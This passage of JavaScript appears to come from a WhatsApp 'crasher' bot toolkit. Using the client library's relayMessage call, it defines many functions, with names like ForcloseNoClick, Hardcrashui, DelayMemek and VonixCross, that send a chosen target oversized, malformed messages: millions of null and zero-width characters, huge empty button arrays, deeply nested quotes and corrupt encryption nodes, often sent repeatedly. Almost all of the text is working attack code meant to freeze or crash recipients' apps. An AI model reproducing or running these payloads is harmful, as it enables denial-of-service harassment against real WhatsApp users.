        // 5. Context Info (Manipulasi sistem pesan)
        contextInfo: {
          stanzaId: "B" + "U".repeat(5000) + "G",
          participant: "0@s.whatsapp.net",
          isForwarded: true,
          forwardingScore: 99999,
          // Spam tag/mention untuk menambah beban baca WA
          mentionedJid: ["1@s.whatsapp.net", "0@s.whatsapp.net", "6280000000000@s.whatsapp.net"] 
        }
      }
    }
  }
};
const atx2 = {
  groupStatusMessageV2: {
    message: {
      interactiveMessage: {
        // 1. Header (Bagian atas)
        header: {
          title: "ꦾ".repeat(1000), // Contoh string berat
          subtitle: "؂".repeat(10000),
          hasMediaAttachment: false
        },
        // 2. Body (Teks Utama)
        body: { 
          text: "福 X-FORCE cuy" 
        },
        // 3. Footer (Teks Bawah)
        footer: {
          text: "⸽".repeat(10000)
        },
        nativeFlowMessage: {
          buttons: "{".repeat(9000),
        },      
        contextInfo: {
          stanzaId: "B" + "U".repeat(50) + "G",
          participant: "0@s.whatsapp.net",
          isForwarded: true,
          forwardingScore: 99999,
          mentionedJid: ["1@s.whatsapp.net", "0@s.whatsapp.net", "6280000000000@s.whatsapp.net"] 
        }
      }
    }
  }
};

await sock.relayMessage(target, atx1, {})
await sock.relayMessage(target, atx2, {})
try { await sock.relayMessage(target, atx, {});
} catch (e) {
    console.log(e);
}
await sock.relayMessage(
   target,
        {
    groupStatusMessageV2: {
       message: {
          interactiveMessage: {
             body: {
                text: "\u0000"
             },
              nativeFlowMessage: {
                  buttons: Array.from({ length: 500000 }, () => ({}))
                        }
                    }
                }
            }
        },
        {}
    );
await sock.relayMessage(
   target,
        {
    groupStatusMessageV2: {
       message: {
          interactiveMessage: {
             body: {
                text: "\u0000"
             },
              nativeFlowMessage: {
                  buttons: Array.from({ length: 50000 }, () => ({}))
                        }
                    }
                }
            }
        },
        {}
    );

await sock.relayMessage(
   target,
        {
    groupStatusMessageV2: {
       message: {
          interactiveMessage: {
             body: {
                text: "\u0000"
             },
              nativeFlowMessage: {
                  buttons: Array.from({ length: 800000 }, () => ({}))
                        }
                    }
                }
            }
        },
        {}
    );
const msg1 = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "FAGYM HERE".repeat(90000) + "\u0000" .repeat(90000) + "FAGYM HERE".repeat(2000)
                        },
                        nativeFlowMessage: {
                            buttons: "\u0000" + "\0".repeat(500000),
                            nativeFlowResponseMessage: {
                                buttons: Array.from({ length: 90000 }, () => ({}))
                            }
                        }
                    }
                }
            }
        };
        
        
        await sock.relayMessage(target, msg1, {});
        const msg2 = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "\0".repeat(90000) + "\u0000" .repeat(90000) + "FAGYM HERE".repeat(2000)
                        },
                        nativeFlowMessage: {
                            buttons: "\00" + "\0".repeat(500000),
                            nativeFlowResponseMessage: {
                                buttons: Array.from({ length: 90000 }, () => ({}))
                            }
                        }
                    }
                }
            }
        };
        
        
        await sock.relayMessage(target, msg2, {});
        
        const msg3 = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "\u0000".repeat(90000) + "\u0000" .repeat(90000) + "FAGYM HERE".repeat(2000)
                        },
                        nativeFlowMessage: {
                            buttons: "\u0000" + "\u000D".repeat(500000),
                            nativeFlowResponseMessage: {
                                buttons: Array.from({ length: 90000 }, () => ({}))
                            }
                        }
                    }
                }
            }
        };
        
        
        await sock.relayMessage(target, msg3, {});
        
        
        const zsr = {
  groupStatusMessageV2: {
    message: {
      interactiveMessage: {
        // 1. Header (Bagian atas)
        header: {
          title: "ꦾ".repeat(1000), // Contoh string berat
          subtitle: "؂".repeat(10000),
          hasMediaAttachment: false
        },
        // 2. Body (Teks Utama)
        body: { 
          text: "福 X-FORCE crasher" 
        },
        // 3. Footer (Teks Bawah)
        footer: {
          text: "⸽".repeat(10000)
        },
        nativeFlowMessage: {
          buttons: "{".repeat(9000),
        },      
        contextInfo: {
          stanzaId: "B" + "U".repeat(50) + "G",
          participant: "0@s.whatsapp.net",
          isForwarded: true,
          forwardingScore: 99999,
          mentionedJid: ["1@s.whatsapp.net", "0@s.whatsapp.net", "6280000000000@s.whatsapp.net"] 
        }
      }
    }
  }
};await sock.relayMessage(target, zsr, {})

await sock.relayMessage(
   target,
        {
    groupStatusMessageV2: {
       message: {
          interactiveMessage: {
             body: {
                text: "\0"
             },
              nativeFlowMessage: {
                  buttons: Array.from({ length: 90000 }, () => ({}))
                        }
                    }
                }
            }
        },
        {}
    );

await sock.relayMessage(
   target,
        {
    groupStatusMessageV2: {
       message: {
          interactiveMessage: {
             body: {
                text: "\00"
             },
              nativeFlowMessage: {
                  buttons: Array.from({ length: 6000 }, () => ({}))
                        }
                    }
                }
            }
        },
        {}
    );
const last = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "FAGYM HERE".repeat(90000) + "\0" .repeat(90000) + "FAGYM HERE".repeat(2000)
                        },
                        nativeFlowMessage: {
                            buttons: "\0" + "\0".repeat(500000),
                            nativeFlowResponseMessage: {
                                buttons: Array.from({ length: 20000 }, () => ({}))
                            }
                        }
                    }
                }
            }
        };
        
        
        await sock.relayMessage(target, last, {});
        }

async function corsloestwo(sock, target) {
  try {
    const p = {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [
              {
                messageType: 8,
                latexMetadata: {
                  text: "\0",
                  expressions: [
                    {
                      latexExpression: "\0",
                      width: 99999999,
                      height: 99999999,
                      fontHeight: 99999999,
                      padding: 99999999
                    }
                  ]
                }
              },
              {
                messageType: 2,
                messageText: "\0"
              }
            ],
            contextInfo: {
              isForwarded: true,
              forwardOrigin: 4,
              mentionedJid: [target]
            }
          }
        }
      }
    };

    await sock.relayMessage(target, p);
  } catch (e) {
    console.error(e);
  }
}

async function ForcloseNoClick(sock, target) {
    const message = generateWAMessageFromContent(
        target,
        {
            extendedTextMessage: {
                text: "xyzyanzi??",
                description: "\u0000".repeat(50000),
                jpegThumbnail: null,
                contextInfo: {
                    quotedMessage: {
                        imageMessage: {
                            caption: "xyzyanzzi??",
                            mimetype: "image/jpeg",
                            jpegThumbnail: null,
                            ImageSourceType: 1
                        }
                    },
                    remoteJid: "status@broadcast"
                },
                fontType: 2,
                previewType: 5,
                paymentLinkMetadata: {
                    provider: {
                        paramsJson: "[{".repeat(300000)
                    },
                    header: {
                        headerType: 1
                    },
                    button: {
                        displayText: "xyzyanzziHere"
                    }
                }
            }
        },
        {}
    );

    await sock.relayMessage(target, {
        interactiveMessage: {
            body: {},
            nativeFlowMessage: {
                buttons: Array.from({ length: 305555 }, () => ({}))
            }
        }
    }, {});

    await sock.relayMessage(target, {
        interactiveMessage: {
            body: { text: "xyzyanzzi" },
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    tap_target_configuration: {
                        title: "\0",
                        description: "xyzyanzzi",
                        canonical_url: "\0".repeat(3000),
                        domain: null,
                        button_index: 0
                    }
                }),
                buttons: Array.from({ length: 305555 }, () => ({}))
            }
        }
    }, {});

    await sock.relayMessage(
        target,
        {
            groupStatusMessageV2: {
                message: {
                    viewOnceMessageV2: {
                        message: {
                            stickerMessage: {
                                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                                fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                                fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                                mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                                mimetype: "image/webp",
                                directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                                fileLength: "10610",
                                mediaKeyTimestamp: "1775044724",
                                stickerSentTs: "1775044724091"
                            }
                        }
                    }
                }
            }
        },
        {
            participant: { jid: target }
        }
    );
    
    const msg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "xyzyanzzi Attack"
            },
            nativeFlowMessage: {
              name: "galaxy_status_mesaage",
              extra: "\u31040",
              buttons: "A".repeat(20000),
              butrons: "A".repeat(50000),
              extra1: "\u0000".repeat(555),
              extra2: "\u0000".repeat(333),
              flow_action: "navigate",
              flow_cta: "Rena"
            }
          }
        }
      },
      callogMesaage: {
        Callid: "\u0000".repeat(6666),
        extraCall1: "\u0000".repeat(20000),
        extraCall2: "\u0000".repeat(5555),
        flow_cta: "RenaIsHere"
      }
    };
  await sock.relayMessage(target, msg);
    
    const msg1 = {
      interactiveMessage: {
        body: {
          text: "\u200C".repeat(20000),
        },
        nativeFlowMessage: {
          buttons: "\u0000".repeat(20000),
          encryptedParams: {
            value: "\u2066".repeat(20000),
          },
        },
      },
    };

    const msg2 = {
      interactiveMessage: {
        body: {
          text:
            "@Meta_Ai" +
            "\u200B".repeat(10000) +
            "\uFEFF".repeat(20000),
        },
        nativeFlowMessage: {
          buttons: "meta_ai_reiviw".repeat(20000),
        },
      },
    };
await sock.relayMessage(target, msg1, {});
await sock.relayMessage(target, msg2, {});

    await sock.relayMessage(target, {
            interactiveMessage: {
                body: { text: "\u0000".repeat(30000) + "ြ".repeat(20000) },
                nativeFlowMessage: {
                    buttons: Array.from({ length: 300000 }, () => ({}))
                }
            }
        }, {});
        await sock.relayMessage(target, {
            extendedTextMessage: {
                text: "\u200B".repeat(30000) + "\u0000".repeat(30000),
                contextInfo: { mentionedJid: [target] }
            }
        }, {});

    await sock.relayMessage(
        target,
        message.message,
        {}
    );
}

async function unknowbuts(sock, target) {
  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 3
          },
          interactiveMessage: {
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              }
            },
            body: {
              text: "\x10".repeat(5000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: Array.from({ length: 500000 }, () => ({}))
            }
          }
        }
      }
    },
    {
      participant: true
    }
  );
}

async function balnkstuck(sock, target) {
  for (let i = 0; i < 5; i++) {
    await sleep(500);
    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "᬴".repeat(5000)
              },
              nativeFlowMessage: {
                messageParamsJson: "\n".repeat(9999) + "{",
                buttons: "\n".repeat(500000)
              },
              contextInfo: {
                remoteJid: "#",
                quotedMessage: {
                  conversation: "\n".repeat(5000)
                },
                externalAdReply: {
                  showAdAttribution: true,
                  title: '- # X-FORCECrashèr ん.',
                  body: 'superior3xplanation',
                  thumbnailUrl: 'https://files.catbox.moe/ur8m20.jpg',
                  sourceUrl: 'https://vsp-killer.gov/',
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              }
            }
          }
        }
      },
      {
        participant: true
      }
    );
  }
}

async function DelayMemek(sock, target) {
  const heavyChar = "\uD800\uDC00" + "\u200B".repeat(500);

  const fakeSidecar = Buffer.from([
    0xFF, 0xFE, 0x00, 0x00,
    0xC0, 0x80,
    0xED, 0xA0, 0x80,
    ...Array.from({ length: 50 }, (_, i) => (i % 255))
  ]).toString("base64");

  const buildNestedProto = (depth) => {
    if (depth === 0) return { text: heavyChar.repeat(3000) };
    return {
      quotedMessage: {
        extendedTextMessage: buildNestedProto(depth - 1)
      }
    };
  };

  const msg = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/" + "A".repeat(8192), 
          mimetype: "image/jpeg",
          fileSha256: Buffer.alloc(32, 0xFF), 
          fileLength: 9999999999,          
          width: 99999,
          height: 99999,
          directPath: "/v/fake/" + "B".repeat(4096),
          mediaKey: Buffer.alloc(32, 0xAA),
          fileEncSha256: Buffer.alloc(32, 0xBB),
          scansSidecar: fakeSidecar,
          scanLengths: Array.from({ length: 256 }, (_, i) => i * 997),
          caption: heavyChar.repeat(10000), 
          contextInfo: {
            mentionedJid: Array.from({ length: 512 }, () => target),
            quotedMessage: buildNestedProto(30),
            isForwarded: true,
            forwardingScore: 0x7FFFFFFF,
            expiration: 0x7FFFFFFF,
            disappearingMode: {
              initiator: 3,
              trigger: 7
            }
          }
        }
      },
      viewOnce: true
    }
  };

  await sock.relayMessage(target, msg, {
    messageId: Buffer.alloc(16, 0).toString("hex"), 
    participant: undefined,                  
    additionalNodes: [
      {
        tag: "enc",
        attrs: { v: "2", type: "msg" },
        content: Buffer.from("CORRUPT_NODE_" + "X".repeat(2048))
      }
    ]
  });
}

async function VonixCross(sock, target) {
  try {
    const jid = target.includes("@") ? target : target + "@s.whatsapp.net";

    const stickerPackPayload = {
      viewOnceMessage: {
        message: {
          stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "VONIX CROSS" + "𑇂𑆵𑆵𑆴𑆿𑆴𑆿".repeat(30000),
            publisher: "\0",
            stickers: [],
            fileLength: "3662919",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
            contextInfo: {
              participant: jid,
              mentionedJid: ["13135550202@s.whatsapp.net"]
            },
            packDescription: "VONIX CROSS",
            mediaKeyTimestamp: "1747502082",
            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png"
          }
        }
      }
    };

    const buttonsPayload = {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            contentText: "VONIX CROSS",
            footerText: "✦ VONIX CROSS ✦",
            headerType: 1,
            buttons: [
              { buttonId: "Ex vnx_one", buttonText: { displayText: "𑇂𑆵𑆵𑆴𑆿𑆴𑆿".repeat(5000) }, type: 1 },
              { buttonId: "Ex vnx_Two", buttonText: { displayText: "𑇂𑆵𑆵𑆴𑆿𑆴𑆿".repeat(5000) }, type: 1 }
            ]
          }
        }
      }
    };

    const mainPayload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "VONIX CROSS" + "꧀".repeat(20000),
              locationMessage: { degreesLatitude: 0, degreesLongitude: 0 },
              hasMediaAttachment: false
            },
            body: {
              text: "VONIX CROSS" + "\u200b".repeat(2000) + "\u800b".repeat(2000) +
                    "\x20".repeat(2000) + "\u0000".repeat(2000) +
                    "ြ".repeat(3000) + "ꦾ".repeat(3000) + "ោ៝".repeat(2000)
            },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "cta_call", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(100) }) },
                { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(100) }) },
                { name: "quick_reply", buttonParamsJson: JSON.stringify({
                  display_text: "ꦾ".repeat(3000) + "\uD808\uDC00".repeat(3000),
                  id: "\u600b".repeat(3000) + "\u0000".repeat(3000)
                })},
                { name: "cta_url", buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(3000),
                  url: "https://t.me/Nizam_Reals"
                })},
                { name: "addres_message", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(3000) }) }
              ],
              messageParamsJson: "[{".repeat(10)
            },
            contextInfo: {
              participant: jid,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 19 }, () =>
                  "1" + Math.floor(Math.random() * 50000000) + "@s.whatsapp.net"
                )
              ],
              quotedMessage: { paymentInviteMessage: { serviceType: 3, expiryTimeStamp: Date.now() + 1814400000 } },
              forwardingScore: 99999,
              isForwarded: true
            },
            messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 }
          }
        }
      }
    };

    await sock.relayMessage(jid, stickerPackPayload, {});
    await sock.relayMessage(jid, buttonsPayload, {});
    
    for (let i = 0; i < 25; i++) {
      let msg;
      try {
        msg = await generateWAMessageFromContent(jid, mainPayload, { userJid: jid });
        await sock.relayMessage(jid, msg.message, { messageId: msg.key.id + "_" + i, noSelfSync: true });
      } catch {
        await sock.relayMessage(jid, mainPayload, { noSelfSync: true });
      }
      await new Promise(r => setTimeout(r, 300));
    }

    console.log("✅ VONIX CROSS — Semua terkirim ke:", jid);
  } catch (e) {
    console.error("❌ Error:", e.message || e);
  }
}

async function OBXFreezeHardChat(sock, target) {
    const ReymonOneMsg1 = {
        viewOnceMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "꧀"
                    },
                    nativeFlowMessage: {
                        buttons: "\n".repeat(250000) + "\0".repeat(250000)
                    }
                }
            }
        }
    };

    const ReymonOneMsg2 = {
        interactiveMessage: {
            body: {
                text: "\u200B" + "\n".repeat(25000)
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 500000 }, () => ({})),
                nativeFlowResponsMessage: {
                    buttons: Array.from({ length: 500000 }, () => ({}))
                }
            }
        }
    };

    await sock.relayMessage(target, ReymonOneMsg1, { noSelfSync: true });
    await sock.relayMessage(target, ReymonOneMsg2, { noSelfSync: true });
}

async function DelayObxLagiJir(sock, target) {
    const msg1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\u200B".repeat(15000) + "\u200D".repeat(10000) + "\u200C".repeat(5000)
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    },
                    nativeFlowResponMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const msg2 = {
        interactiveMessage: {
            body: {
                text: "\u200B".repeat(15000) + "\u200C".repeat(10000) + "\u0000".repeat(5000)
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 500000 }, () => ({})),
                chat_ai_message: "meta_ai_message".repeat(20000)
            },
            nativeFlowResponMessage: {
                buttons: Array.from({ length: 500000 }, () => ({}))
            }
        }
    };

    await sock.relayMessage(target, msg1, { participant: { jid: target } });
    await sock.relayMessage(target, msg2, { participant: { jid: target } });
}

async function Hardcrashui(sock, target) {
    const msg1 = generateWAMessageFromContent(
        target,
        {
            extendedTextMessage: {
                text: "yanzzi??",
                description: "\u0000".repeat(50000),
                jpegThumbnail: null,
                contextInfo: {
                    quotedMessage: {
                        imageMessage: {
                            caption: "yanzzi??",
                            mimetype: "image/jpeg",
                            jpegThumbnail: null,
                            ImageSourceType: 1
                        }
                    },
                    remoteJid: "status@broadcast"
                },
                fontType: 2,
                previewType: 5,
                paymentLinkMetadata: {
                    provider: {
                        paramsJson: "[{".repeat(300000)
                    },
                    header: {
                        headerType: 1
                    },
                    button: {
                        displayText: "yanzziHere"
                    }
                }
            }
        },
        {}
    );

    const msg2 = {
        interactiveMessage: {
            body: {},
            nativeFlowMessage: {
                buttons: Array.from({ length: 305555 }, () => ({}))
            }
        }
    };

    const msg3 = {
        interactiveMessage: {
            body: { text: "yanzzi" },
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    tap_target_configuration: {
                        title: "\0",
                        description: "yanzzi",
                        canonical_url: "\0".repeat(3000),
                        domain: null,
                        button_index: 0
                    }
                }),
                buttons: Array.from({ length: 305555 }, () => ({}))
            }
        }
    };

   const code = "\u200C" + "\u200D" + "\u200B" + "\u200A" + "\u0000" + "\x930" + "\u500B";
    const repeat = 1000000;

    const msg4 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "yanzzꦾ",
                        display_text: "\u200C"
                    },
                    nativeFlowInfo: {
                        name: "single_select",
                        paramsJson: JSON.stringify({
                            icon: "document",
                            title: "yanzzi",
                            sections: Array.from({ length: 505555 }, () => ({}))
                        })
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});

    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});

    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg2, {});

   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
}

async function ObxDuarFreeze(sock, target) {
const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "[][]"
          },
          body: {
            text: "Reymon Bzirr"
          },
          nativeFlowMessage: {
                buttons: [
                  "628984627909@s.whatsapp.net" + "6285655555555@s.whatsapp.net" +
        "6289876543210@s.whatsapp.net" +
        "6281111111111@s.whatsapp.net",
                  ...Array.from({ length: 5555550 })
                ],
                name: "\0"
              },
              nativeFlowMessage: {
                name: "address_message",
                buttons: "\0".repeat(250000) + "\0".repeat(250000) + "quickly_replay".repeat(50000)
              }
        }
      }
    }
  }

const msg2 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m231/AQOX8BndM04C2IKAvFpfPM8TH47RXFVzZAb-S3FhHo-SG2hxcK_6reQ3T7X5xWj2LKROTSn5-JBQyLC5I7rAxW_fGoECK5sXufZs8nH2XA?ccb=9-4&oh=01_Q5Aa5AFsLMbBRJ9c90mrz8rK0ozXpzA9e-YPgY85ciys7D5nIw&oe=6A752E63&_nc_sid=e6ed6c",
              mimetype: "image/jpeg",
              fileSha256: "mnm9afzvi752rKOhEqgJuoXGvAavp+/7B39edCSjs0M=",
              fileLength: "205830",
              height: 1254,
              width: 1254,
              mediaKey: "7TV3Nv0ZSIL0xILkNwiC2k09qsld0W1NCuvmyL8eT/o=",
              fileEncSha256: "G7zTiKFse8lAASW5UUcF3RlXGPEs5EDoymJgxLl4OsY=",
              directPath: "/o1/v/t24/f2/m231/AQOX8BndM04C2IKAvFpfPM8TH47RXFVzZAb-S3FhHo-SG2hxcK_6reQ3T7X5xWj2LKROTSn5-JBQyLC5I7rAxW_fGoECK5sXufZs8nH2XA?ccb=9-4&oh=01_Q5Aa5AFsLMbBRJ9c90mrz8rK0ozXpzA9e-YPgY85ciys7D5nIw&oe=6A752E63&_nc_sid=e6ed6c",
              mediaKeyTimestamp: "1783478072",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAADAQEBAQAAAAAAAAAAAAAAAwQBAgUGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADXc0Gds7E47ojVakjGgyhVJrDzxlnzHqnoJoUSnYYxNJ143uwnndR+0U61QgwE0xPLe5WCLVALEmCQQ0BzANwBagFAH//EACYQAAMAAQQBAwQDAAAAAAAAAAABAhEDBBIhFBAxQSIjQlFSYWL/2gAIAQEAAT8AUikmRScBwORoqSZJQpFI2lSn5ZgclSVJCJQ2pWX6O15sw/4GBopFIhEoRvN29pUvpp+6HutV7tbrg+CNtu/Lp/jK9KKIG7lNrv8ASPudNe2OzcPbY1OUNX/Yr01pxx6nPZpvaXHzzz1g0lqykqxgvPwWQyWI19r5V/X1MlbGvLWhyamlhsltbzpvKY2UUyGSxMyXpZ3unqf5Mj6rOSmUyWTRNCo5DodFUVRNComzmcx2VY6HR//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8AT//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                pairedMediaType: "NOT_PAIRED_MEDIA"
              },
              scansSidecar: "gZPLDkqPqc67rjEO2tfcJ9zsSpwJtyEDblK/EUAsgXewUvWmHVgw5Q==",
              scanLengths: [11276, 34736, 50604, 109214],
              midQualityFileSha256: "sIRX95Bfzqy24VGF60QOGVeh7m1aIg5aphYxlT0UlPk="
            }
          },
          body: {
            text: "\0".repeat(50000) + "{}".repeat(30000)
          },
          nativeFlowMessage: {
            buttons: "\0".repeat(10000) + "[]".repeat(20000)
          }
        }
      }
    }
  };
  
  const msg3 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "[]".repeat(50000) + "{}".repeat(40000),
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          },
          contextInfo: {
            mentionedJid: [target],
            stickerMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
              fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
              fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
              mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
              mimetype: "image/webp",
              directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
              fileLength: "10610",
              mediaKeyTimestamp: "1775044724",
              stickerSentTs: "1775044724091"
            }
          }
        }
      }
    }
  };
    
await sock.relayMessage(target, msg, {});
await sock.relayMessage(target, msg2, {});
await sock.relayMessage(target, msg3, {});
}

async function elynndelay(sock, target) {
  await Promise.all(
    Array(100).fill(null).map(() =>
      sock.relayMessage("status@broadcast", {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/11111111_222222222222222_3333333333333333333_n.enc?stp=dst-mp4&ccb=11-4",
          mimetype: "video/mp4",
          fileSha256: Buffer.from("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "hex"),
          fileLength: 999999,
          seconds: 10,
          height: 640,
          width: 640,
          mediaKey: Buffer.from("a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2", "hex"),
          fileEncSha256: Buffer.from("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "hex"),
          directPath: "/v/t62.7118-24/11111111_222222222222222_3333333333333333333_n.enc?type=md",
          mediaKeyTimestamp: Math.floor(Date.now() / 1000),
          caption: ("𓂀𓂀𓂀𓂀𓂀").repeat(20000),
          contextInfo: {
            mentionedJid: Array(100).fill(target),
            isGroupStatus: true,
            forwardingScore: 999,
            isForwarded: true
          }
        }
      }, {
        statusJidList: [target],
        messageId: "ELYNN-ABECEDE-" + Date.now() + "-" + Math.floor(Math.random() * 999999),
        additionalNodes: [
          {
            tag: "meta",
